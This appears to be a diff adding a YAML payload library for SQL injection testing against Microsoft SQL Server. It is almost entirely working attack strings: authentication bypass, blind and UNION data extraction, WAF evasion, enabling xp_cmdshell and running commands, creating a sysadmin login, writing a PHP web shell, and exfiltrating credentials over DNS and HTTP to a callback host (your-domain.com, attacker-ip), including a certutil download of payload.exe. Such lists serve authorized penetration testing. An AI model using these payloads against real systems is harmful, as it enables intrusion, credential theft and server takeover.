@@ -1,0 +1,447 @@
+# Microsoft SQL Server SQL Injection Test Payloads
+# AUTHORIZED TESTING ONLY
+# Database: MSSQL 2008 - 2022
+# Last Updated: 2024
+
+# ==============================================================================
+# BOOLEAN-BASED BLIND SQL INJECTION
+# ==============================================================================
+
+# TRUE Condition Payloads
+boolean_true_payload: "' OR 1=1--"
+
+# Alternative TRUE conditions
+boolean_true_alternatives:
+  - "' OR '1'='1'--"
+  - "' OR 'a'='a'--"
+  - "') OR (1=1)--"
+  - "')) OR ((1=1))--"
+  - "1' OR '1'='1"
+  - "admin' OR 1=1--"
+  - "' OR 1=1 /*"
+  - "' OR 1=1;--"
+  - "' OR 1=1 AND ''='"
+  - "admin' OR 'x'='x'--"
+  - "1 OR 1=1"
+  - "') OR 1=1--"
+
+# FALSE Condition Payloads
+boolean_false_payload: "' OR 1=2--"
+
+# Alternative FALSE conditions
+boolean_false_alternatives:
+  - "' OR '1'='2'--"
+  - "' OR 'a'='b'--"
+  - "') OR (1=2)--"
+  - "' OR 0=1--"
+  - "1 OR 1=2"
+
+# ==============================================================================
+# TIME-BASED BLIND SQL INJECTION
+# ==============================================================================
+
+# Primary time delay payload (3 second delay)
+time_delay_payload: "'; WAITFOR DELAY '00:00:03'--"
+
+# Alternative time-based payloads
+time_delay_alternatives:
+  - "' WAITFOR DELAY '00:00:03'--"
+  - "'; WAITFOR DELAY '0:0:3'--"
+  - "1'; WAITFOR DELAY '00:00:03'--"
+  - "') WAITFOR DELAY '00:00:03'--"
+  - "'; IF(1=1) WAITFOR DELAY '00:00:03'--"
+  - "'; WAITFOR TIME '23:59:59'--"
+  - "' OR 1=1 WAITFOR DELAY '00:00:03'--"
+  - "1 WAITFOR DELAY '00:00:03'"
+  - "'; IF EXISTS(SELECT * FROM users) WAITFOR DELAY '00:00:03'--"
+
+# Conditional time delays
+time_conditional_payloads:
+  - "'; IF(1=1) WAITFOR DELAY '00:00:03'--"
+  - "'; IF(SELECT SYSTEM_USER)='sa' WAITFOR DELAY '00:00:03'--"
+  - "'; IF(SELECT DB_NAME())='master' WAITFOR DELAY '00:00:03'--"
+  - "'; IF(LEN(DB_NAME())>5) WAITFOR DELAY '00:00:03'--"
+  - "'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>100) WAITFOR DELAY '00:00:03'--"
+  - "'; IF EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users') WAITFOR DELAY '00:00:03'--"
+
+# ==============================================================================
+# ERROR-BASED SQL INJECTION
+# ==============================================================================
+
+# Basic error probe
+error_probe_payload: "'"
+
+# Advanced error-based payloads
+error_based_payloads:
+  - "'"
+  - "''"
+  - "' AND 1=CONVERT(INT,@@VERSION)--"
+  - "' AND 1=CAST(@@VERSION AS INT)--"
+  - "' AND 1=DB_NAME()--"
+  - "' AND 1=USER_NAME()--"
+  - "' AND 1=(SELECT TOP 1 name FROM sys.databases)--"
+  - "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--"
+  - "' AND 1/0=1--"
+  - "' UNION SELECT 1/0--"
+  - "' AND CONVERT(INT,(SELECT @@VERSION))--"
+  - "' AND CAST((SELECT DB_NAME()) AS INT)--"
+
+# XML-based error extraction
+error_xml_based:
+  - "' AND 1=(SELECT TOP 1 CAST(name AS VARCHAR(8000)) FROM sys.databases FOR XML PATH(''))--"
+  - "' UNION SELECT NULL,NULL WHERE 1=CONVERT(INT,(SELECT CHAR(58)+CHAR(58)+(SELECT TOP 1 name FROM sys.databases)))--"
+
+# ==============================================================================
+# UNION-BASED SQL INJECTION
+# ==============================================================================
+
+# Basic UNION payloads
+union_payloads:
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT 1,2,3--"
+  - "' UNION SELECT 1,2,3,4--"
+  - "' UNION ALL SELECT NULL--"
+  - "' ORDER BY 1--"
+  - "' ORDER BY 2--"
+  - "' ORDER BY 3--"
+  - "' ORDER BY 10--"
+
+# Information extraction via UNION
+union_extraction:
+  - "' UNION SELECT @@VERSION,DB_NAME(),SYSTEM_USER--"
+  - "' UNION SELECT NULL,@@VERSION--"
+  - "' UNION SELECT NULL,DB_NAME()--"
+  - "' UNION SELECT NULL,SYSTEM_USER--"
+  - "' UNION SELECT NULL,USER_NAME()--"
+  - "' UNION SELECT NULL,@@SERVERNAME--"
+  - "' UNION SELECT NULL,name FROM sys.databases--"
+  - "' UNION SELECT NULL,table_name FROM information_schema.tables--"
+  - "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--"
+  - "' UNION SELECT NULL,username+':'+password FROM users--"
+  - "' UNION SELECT NULL,name FROM sys.objects WHERE type='U'--"
+
+# ==============================================================================
+# OUT-OF-BAND (OOB) SQL INJECTION
+# ==============================================================================
+
+# DNS-based OOB (Replace 'your-domain.com' with your callback domain)
+oob_dns_payload: "'; EXEC xp_dirtree '//'+@@VERSION+'.your-domain.com/a'--"
+
+# Alternative DNS OOB payloads
+oob_dns_alternatives:
+  - "'; EXEC master..xp_dirtree '//your-domain.com/a'--"
+  - "'; EXEC master.dbo.xp_dirtree '\\\\your-domain.com\\a'--"
+  - "'; EXEC xp_fileexist '\\\\your-domain.com\\a'--"
+  - "'; EXEC xp_getfiledetails '\\\\your-domain.com\\a'--"
+  - "'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+DB_NAME()+'.your-domain.com\\a'; EXEC xp_dirtree @q--"
+
+# HTTP-based OOB
+oob_http_payload: "'; EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://your-domain.com/?data='+DB_NAME()--"
+
+# Alternative HTTP OOB
+oob_http_alternatives:
+  - "'; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP',@obj OUT; EXEC sp_OAMethod @obj,'open','GET','http://your-domain.com/',false--"
+  - "'; EXEC xp_cmdshell 'curl http://your-domain.com/'--"
+  - "'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://your-domain.com/payload.exe'--"
+
+# ==============================================================================
+# STACKED QUERIES
+# ==============================================================================
+
+stacked_queries:
+  - "'; WAITFOR DELAY '00:00:03'--"
+  - "'; DROP TABLE test--"
+  - "'; CREATE TABLE test(id INT)--"
+  - "'; INSERT INTO logs VALUES('injected')--"
+  - "'; UPDATE users SET password='hacked' WHERE id=1--"
+  - "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--"
+  - "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
+
+# ==============================================================================
+# AUTHENTICATION BYPASS
+# ==============================================================================
+
+auth_bypass_payloads:
+  - "admin'--"
+  - "admin' OR 1=1--"
+  - "admin') OR (1=1)--"
+  - "' OR 1=1--"
+  - "' OR '1'='1"
+  - "admin' OR '1'='1'--"
+  - "') OR ('1'='1'--"
+  - "' OR ''='"
+  - "' OR 'x'='x"
+  - "admin'/*"
+  - "' OR 1=1/*"
+  - "') OR 1=1--"
+  - "admin' OR 'a'='a'--"
+
+# ==============================================================================
+# WAF/FILTER BYPASS TECHNIQUES
+# ==============================================================================
+
+# Comment-based obfuscation
+waf_bypass_comments:
+  - "' OR/**/1=1--"
+  - "' OR/*comment*/1=1--"
+  - "'/**/OR/**/1=1--"
+  - "' OR 1=1/*comment*/--"
+  - "'/**/UNION/**/SELECT/**/NULL--"
+
+# Case variation
+waf_bypass_case:
+  - "' Or 1=1--"
+  - "' oR 1=1--"
+  - "' UnIoN SeLeCt NULL--"
+
+# URL encoding
+waf_bypass_encoding:
+  - "%27%20OR%201=1--"
+  - "%27%20UNION%20SELECT%20NULL--"
+
+# Double encoding
+waf_bypass_double_encoding:
+  - "%2527%2520OR%25201=1--"
+
+# Unicode
+waf_bypass_unicode:
+  - "' %55nion %53elect NULL--"
+
+# NULL byte injection
+waf_bypass_null:
+  - "' OR 1=1%00--"
+  - "' UNION SELECT NULL%00--"
+
+# Inline comments
+waf_bypass_inline:
+  - "' OR 1/*comment*/=1--"
+  - "UN/**/ION SE/**/LECT"
+
+# ==============================================================================
+# MSSQL-SPECIFIC FEATURES
+# ==============================================================================
+
+# Command execution via xp_cmdshell
+command_execution:
+  - "'; EXEC xp_cmdshell 'whoami'--"
+  - "'; EXEC master..xp_cmdshell 'ipconfig'--"
+  - "'; EXEC xp_cmdshell 'net user'--"
+  - "'; EXEC xp_cmdshell 'dir C:\\'--"
+  - "'; EXEC xp_cmdshell 'type C:\\Windows\\System32\\drivers\\etc\\hosts'--"
+  - "'; EXEC xp_cmdshell 'powershell -Command Get-Process'--"
+
+# Enable xp_cmdshell (requires sysadmin)
+enable_xp_cmdshell:
+  - "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
+
+# File operations via OPENROWSET
+file_operations_openrowset:
+  - "'; SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\win.ini', SINGLE_CLOB) AS Contents--"
+  - "'; SELECT * FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_NCLOB) AS Contents--"
+
+# Linked servers
+linked_servers:
+  - "'; SELECT * FROM OPENQUERY(LinkedServer,'SELECT @@VERSION')--"
+  - "'; EXEC sp_addlinkedserver 'ATTACKER','','SQLOLEDB','attacker-ip'--"
+  - "'; EXEC ('xp_cmdshell ''dir''') AT LinkedServer--"
+
+# ==============================================================================
+# PRIVILEGE ESCALATION
+# ==============================================================================
+
+privilege_escalation:
+  # Create admin user
+  - "'; EXEC sp_addlogin 'hacker','Password123!'--"
+  - "'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--"
+
+  # File write
+  - "'; EXEC xp_cmdshell 'echo ^<?php system($_GET[\"cmd\"]); ?^> > C:\\inetpub\\wwwroot\\shell.php'--"
+
+  # Registry operations
+  - "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER','ObjectName'--"
+  - "'; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','Software\\Test','TestValue','REG_SZ','Injected'--"
+
+# ==============================================================================
+# INFORMATION GATHERING
+# ==============================================================================
+
+info_gathering:
+  # Version
+  - "' UNION SELECT @@VERSION--"
+  - "' UNION SELECT SERVERPROPERTY('ProductVersion')--"
+
+  # Current user
+  - "' UNION SELECT SYSTEM_USER--"
+  - "' UNION SELECT USER_NAME()--"
+  - "' UNION SELECT SUSER_SNAME()--"
+  - "' UNION SELECT ORIGINAL_LOGIN()--"
+
+  # Current database
+  - "' UNION SELECT DB_NAME()--"
+  - "' UNION SELECT DB_NAME(1)--"
+
+  # Server name
+  - "' UNION SELECT @@SERVERNAME--"
+  - "' UNION SELECT SERVERPROPERTY('ServerName')--"
+
+  # All databases
+  - "' UNION SELECT STRING_AGG(name,',') FROM sys.databases--"
+  - "' UNION SELECT name FROM master..sysdatabases--"
+
+  # All tables
+  - "' UNION SELECT STRING_AGG(table_name,',') FROM information_schema.tables--"
+  - "' UNION SELECT name FROM sys.tables--"
+
+  # All columns
+  - "' UNION SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='users'--"
+
+  # User privileges
+  - "'; SELECT * FROM fn_my_permissions(NULL,'DATABASE')--"
+  - "'; SELECT IS_SRVROLEMEMBER('sysadmin')--"
+  - "'; SELECT IS_MEMBER('db_owner')--"
+
+  # Server roles
+  - "'; SELECT name FROM sys.server_principals WHERE type='R'--"
+
+  # Logins
+  - "'; SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE type IN('S','U','G')--"
+
+# ==============================================================================
+# FILE OPERATIONS
+# ==============================================================================
+
+file_operations:
+  # Read file via BULK
+  - "'; SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts',SINGLE_CLOB) AS Contents--"
+  - "'; SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config',SINGLE_BLOB) AS Contents--"
+
+  # Write file via bcp
+  - "'; EXEC xp_cmdshell 'bcp \"SELECT ''test''\" queryout C:\\test.txt -c -T'--"
+
+  # Write file via xp_cmdshell
+  - "'; EXEC xp_cmdshell 'echo test > C:\\test.txt'--"
+
+# ==============================================================================
+# ADVANCED TECHNIQUES
+# ==============================================================================
+
+# Blind SQL injection - Bit-by-bit extraction
+blind_extraction:
+  - "'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>100) WAITFOR DELAY '00:00:03'--"
+  - "'; IF(ASCII(SUBSTRING(DB_NAME(),1,1))=109) WAITFOR DELAY '00:00:03'--"  # 'm'
+  - "'; IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '00:00:03'--"
+  - "'; IF(LEN(DB_NAME())>5) WAITFOR DELAY '00:00:03'--"
+  - "'; IF((SELECT COUNT(*) FROM information_schema.tables)>10) WAITFOR DELAY '00:00:03'--"
+
+# Polyglot payloads
+polyglot_payloads:
+  - "1' OR '1'='1' /*"
+  - "1' OR '1'='1'--"
+  - "admin' OR 1=1/**/--/**/"
+  - "') OR (1=1)--"
+
+# ==============================================================================
+# CONTEXT-SPECIFIC PAYLOADS
+# ==============================================================================
+
+# Numeric context
+numeric_context:
+  - "1 OR 1=1"
+  - "1 OR 1=1--"
+  - "1) OR (1=1"
+  - "1)) OR ((1=1"
+
+# String context (single quote)
+string_single_quote:
+  - "' OR '1'='1"
+  - "' OR 1=1--"
+  - "') OR ('1'='1"
+
+# String context (double quote)
+string_double_quote:
+  - "\" OR \"1\"=\"1"
+  - "\" OR 1=1--"
+
+# JSON context
+json_context:
+  - "' OR '1'='1'} --"
+  - "\", \"admin\":true, \"x\":\"1"
+
+# ==============================================================================
+# MSSQL INJECTION CHAINS
+# ==============================================================================
+
+# Full command execution chain
+full_exploitation_chain:
+  - "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--"
+
+# Data exfiltration via DNS
+dns_exfiltration_chain:
+  - "'; DECLARE @data VARCHAR(MAX); SET @data=(SELECT TOP 1 username+':'+password FROM users); EXEC('xp_dirtree ''\\\\'+@data+'.your-domain.com\\a''')--"
+
+# ==============================================================================
+# DATA EXFILTRATION
+# ==============================================================================
+
+data_exfiltration:
+  # Via DNS
+  - "'; DECLARE @d VARCHAR(MAX); SET @d=(SELECT DB_NAME()); EXEC xp_dirtree CONCAT('\\\\',@d,'.your-domain.com\\a')--"
+
+  # Via HTTP
+  - "'; EXEC xp_cmdshell 'powershell -Command \"Invoke-WebRequest -Uri ''http://your-domain.com/?data=''+(Get-Content C:\\data.txt)\"'--"
+
+  # Via file
+  - "'; EXEC xp_cmdshell 'bcp \"SELECT * FROM users\" queryout C:\\exfil.txt -c -T'--"
+
+# ==============================================================================
+# TESTING NOTES
+# ==============================================================================
+
+# IMPORTANT REMINDERS:
+# 1. Replace 'your-domain.com' with your actual callback domain
+# 2. Always have written authorization before testing
+# 3. Test in non-production environments first
+# 4. xp_cmdshell is often disabled by default
+# 5. Many features require sysadmin privileges
+
+# MSSQL-SPECIFIC FEATURES TO TEST:
+# 1. xp_cmdshell (command execution)
+# 2. WAITFOR DELAY (time-based)
+# 3. xp_dirtree (DNS OOB)
+# 4. OPENROWSET (file reading)
+# 5. Linked servers
+# 6. sp_OACreate (OLE automation)
+# 7. xp_regread/xp_regwrite (registry)
+
+# DETECTION METHODS:
+# - Boolean-based: Different responses for TRUE vs FALSE
+# - Time-based: Delayed responses using WAITFOR DELAY
+# - Error-based: SQL Server error messages
+# - UNION-based: Extra data in response
+# - OOB: DNS/HTTP requests via xp_dirtree/xp_cmdshell
+# - Stacked queries: Multiple SQL statements with semicolon
+
+# RECOMMENDED TESTING ORDER:
+# 1. Error probe (single quote)
+# 2. Boolean-based (TRUE vs FALSE)
+# 3. Time-based (WAITFOR DELAY)
+# 4. Stacked queries (test with WAITFOR DELAY)
+# 5. UNION-based (for data extraction)
+# 6. OOB (xp_dirtree for DNS)
+# 7. Command execution (if xp_cmdshell enabled)
+
+# PRIVILEGE REQUIREMENTS:
+# - xp_cmdshell: sysadmin or granted permissions
+# - OPENROWSET: ADMINISTER BULK OPERATIONS or ADMINISTER DATABASE BULK OPERATIONS
+# - Linked servers: setupadmin or sysadmin
+# - File operations: Various file system permissions
+
+# SAFETY LIMITS:
+# - Maximum 3 second delays
+# - No destructive operations in production
+# - Rate limiting: max 10-20 requests/second
+# - Test command execution only in isolated environments
+# - Always use least privilege approach
